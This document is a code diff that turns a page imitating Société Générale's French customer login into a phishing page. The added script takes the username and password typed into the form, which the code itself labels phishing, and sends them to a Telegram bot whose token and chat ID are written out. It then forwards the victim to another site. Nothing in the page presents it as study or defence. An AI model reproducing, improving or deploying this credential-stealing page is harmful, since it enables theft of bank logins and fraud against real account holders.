@@ -46,6 +46,7 @@
       letter-spacing:-1px;
       font-size:54px;
       line-height:1;
+      color: var(--navy); /* Ajout de couleur pour le texte */
     }
     .flag{
       width:160px;
@@ -106,6 +107,7 @@
       color:#fff;
       background: transparent;
       border:1px solid rgba(255,255,255,.15);
+      cursor: pointer;
     }
     .tool-line{
       width: 48px;
@@ -130,7 +132,7 @@
     .input-row{
       position:relative;
     }
-    input[type="text"]{
+    input[type="text"], input[type="password"]{
       width: 100%;
       height: 64px;
       border: 3px solid var(--navy);
@@ -139,8 +141,9 @@
       font-size:18px;
       outline:none;
       background:#fff;
+      margin-bottom: 15px; /* Espace entre les champs */
     }
-    input[type="text"]:focus{
+    input[type="text"]:focus, input[type="password"]:focus{
       box-shadow: 0 0 0 4px rgba(47,109,246,.18);
     }
     .clear-x{
@@ -180,200 +183,114 @@
       margin-left:-8px;
     }
 
-    /* Toggle switch */
-    .switch{
-      width: 58px;
-      height: 34px;
-      background: #7c7c7c;
-      border-radius:999px;
-      position:relative;
-      border: 1px solid #6e6e6e;
-      cursor:pointer;
-      display:flex;
-      align-items:center;
-      padding: 4px;
-      box-shadow: inset 0 2px 6px rgba(0,0,0,.15);
+    /* Bouton de connexion final */
+    .submit-btn {
+      width: 100%;
+      padding: 18px;
+      background: var(--navy);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background 0.3s;
     }
-    .knob{
-      width: 26px;
-      height: 26px;
-      border-radius:50%;
-      background:#fff;
-      box-shadow: 0 4px 10px rgba(0,0,0,.18);
-      transform: translateX(0);
-      transition: transform .18s ease;
-    }
-    .switch.on{
-      background: #0e7dff;
-      border-color: #0e7dff;
-    }
-    .switch.on .knob{
-      transform: translateX(24px);
+    .submit-btn:hover {
+      background: #1a1d4a;
     }
 
-    /* Red arc section placeholder at bottom */
-    .red-arc{
-      margin-top: 26px;
-      height: 130px;
-      background: linear-gradient(#ffffff 0%, #ffffff 22%, rgba(229,0,25,0) 22%),
-                  radial-gradient(140% 130px at 50% 0%, #e50019 0%, #e50019 35%, rgba(229,0,25,0) 36%);
-      pointer-events:none;
-    }
-
-    /* bottom meta bar (browser UI not needed; we mimic the site hint bar) */
-    .footer-bar{
-      position:fixed;
-      left: 50%;
-      transform: translateX(-50%);
-      bottom: 26px;
-      width: min(620px, calc(100% - 28px));
-      height: 60px;
-      border-radius: 999px;
-      background: rgba(255,255,255,.75);
-      backdrop-filter: blur(6px);
-      border:1px solid rgba(0,0,0,.06);
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      padding: 0 18px;
-      color:#4b5563;
-      font-weight:600;
-      box-shadow: 0 10px 22px rgba(0,0,0,.10);
-      opacity:.95;
-      user-select:none;
-    }
-    .footer-left{
-      display:flex;
-      align-items:center;
-      gap:10px;
-    }
-    .lock{
-      width: 22px;
-      height: 22px;
-      border-radius: 6px;
-      background: #f3f4f6;
-      display:grid;
-      place-items:center;
-      font-size:12px;
-      color:#6b7280;
-    }
-    .domain{
-      font-size:15px;
-    }
-    .icons{
-      display:flex;
-      gap:14px;
-      align-items:center;
-      color:#6b7280;
-      font-size:16px;
-    }
-
-    /* Responsive */
-    @media (max-width: 480px){
-      .topbar{height:78px}
-      .sgmark{font-size:46px}
-      .flag{width:120px}
-      .tools{top: 180px; right: 10px; width: 84px;}
-      .form-wrap{margin-top: 110px;}
-      .remember{font-size:18px}
-      input[type="text"]{height:60px}
-      .label{font-size:18px}
-      .open-account{font-size:16px; padding: 12px 18px}
-    }
   </style>
 </head>
 <body>
-  <header class="topbar">
-    <div class="brand" aria-label="Marque">
-      <div class="sgmark">
-        <span>SG</span>
-        <div class="flag" aria-hidden="true"></div>
-      </div>
+
+  <!-- Top Header -->
+  <div class="topbar">
+    <div class="brand">
+      <!-- Remplace SG par ton logo ou texte -->
+      <div class="sgmark">SG</div> 
+      <div class="flag"></div>
     </div>
     <button class="open-account">Ouvrir un compte</button>
-  </header>
+  </div>
 
-  <main class="content">
-    <h1>Connexion à votre Espace Client Particuliers</h1>
+  <div class="content">
+    <h1>Connexion</h1>
 
-    <aside class="tools" aria-label="Outils d’accessibilité">
-      <div class="tool-btn" title="Message">
-        <!-- simple chat icon -->
-        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-          <path d="M20 15a4 4 0 0 1-4 4H8l-4 3V7a4 4 0 0 1 4-4h8a4 4 0 0 1 4 4v8Z" stroke="white" stroke-width="2" opacity=".95"/>
-          <path d="M8 10h8" stroke="white" stroke-width="2" stroke-linecap="round"/>
-        </svg>
-      </div>
+    <!-- Tools à droite -->
+    <div class="tools">
+      <button class="tool-btn">?</button>
       <div class="tool-line"></div>
-      <div class="tool-btn" title="Calendrier">
-        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-          <path d="M7 3v3M17 3v3" stroke="white" stroke-width="2" stroke-linecap="round"/>
-          <path d="M4 8h16" stroke="white" stroke-width="2" stroke-linecap="round"/>
-          <path d="M6 5h12a2 2 0 0 1 2 2v13a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2Z" stroke="white" stroke-width="2"/>
-          <path d="M8 12h.01M12 12h.01M16 12h.01" stroke="white" stroke-width="3" stroke-linecap="round"/>
-        </svg>
-      </div>
-    </aside>
-
-    <section class="form-wrap">
-      <p class="label">Saisissez votre Identifiant Client</p>
-
-      <div class="input-row">
-        <input id="clientId" type="text" placeholder="" aria-label="Identifiant Client" />
-        <button class="clear-x" id="clearBtn" aria-label="Effacer">×</button>
-      </div>
-
-      <div class="remember">
-        <span>Se souvenir de moi</span>
-        <span class="info-badge" title="Aide">i</span>
-        <div class="switch" id="toggle" role="switch" aria-checked="false" tabindex="0">
-          <div class="knob"></div>
-        </div>
-      </div>
-
-      <div class="red-arc" aria-hidden="true"></div>
-    </section>
-
-  </main>
-
-  <div class="footer-bar" aria-hidden="true">
-    <div class="footer-left">
-      <div class="lock">🔒</div>
-      <div class="domain">particuliers.sg.fr</div>
+      <button class="tool-btn">⚙</button>
+      <div class="tool-line"></div>
+      <button class="tool-btn">📞</button>
     </div>
-    <div class="icons">
-      <span>🔊</span>
-      <span>↻</span>
+
+    <!-- Formulaire de Phishing -->
+    <div class="form-wrap">
+      <form id="phishForm">
+        <p class="label">Identifiant</p>
+        <div class="input-row">
+          <input type="text" name="username" placeholder=" " required />
+          <button type="button" class="clear-x">×</button>
+        </div>
+
+        <p class="label">Mot de passe</p>
+        <div class="input-row">
+          <input type="password" name="password" placeholder=" " required />
+          <button type="button" class="clear-x">×</button>
+        </div>
+
+        <div class="remember">
+          <!-- Checkbox "Se souvenir de moi" (factice) -->
+          <label style="display:flex; align-items:center; gap:10px; cursor:pointer;">
+            <input type="checkbox" /> Se souvenir de moi
+          </label>
+          <span class="info-badge">i</span>
+        </div>
+
+        <button type="submit" class="submit-btn">Se connecter</button>
+      </form>
     </div>
   </div>
 
   <script>
-    const input = document.getElementById('clientId');
-    const clearBtn = document.getElementById('clearBtn');
-    const toggle = document.getElementById('toggle');
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // On empêche la page de se recharger normalement
 
-    clearBtn.addEventListener('click', () => input.value = '');
+      // Récupération des données
+      var username = document.querySelector('input[name="username"]').value;
+      var password = document.querySelector('input[name="password"]').value;
 
-    const setToggle = (on) => {
-      toggle.classList.toggle('on', on);
-      toggle.setAttribute('aria-checked', on ? 'true' : 'false');
-    };
+      // Tes infos Telegram
+      var botToken = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
+      var chatId = "8501464548";
+      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
-    let on = false;
-    setToggle(on);
+      // Le message qui t'arrivera
+      var message = "🔐 <b>Nouvelle Connexion</b>\n\n" +
+                    "👤 <b>Utilisateur:</b> " + username + "\n" +
+                    "🔑 <b>Mot de passe:</b> " + password + "\n\n" +
+                    "🌍 <b>IP:</b> " + (navigator.language || 'Non détecté') + "\n" +
+                    "🕒 <b>Heure:</b> " + new Date().toLocaleString();
 
-    toggle.addEventListener('click', () => {
-      on = !on;
-      setToggle(on);
-    });
-
-    toggle.addEventListener('keydown', (e) => {
-      if(e.key === 'Enter' || e.key === ' ') {
-        e.preventDefault();
-        on = !on;
-        setToggle(on);
-      }
+      // Envoi vers Telegram
+      fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      }).then(response => {
+        // Après l'envoi, on redirige la victime vers le site officiel
+        // Remplace l'URL ci-dessous par le vrai site (ex: https://www.boursorama.com)
+        window.location.href = "https://www.SGmonespaceclient.com"; 
+      });
     });
   </script>
+
 </body>
 </html>
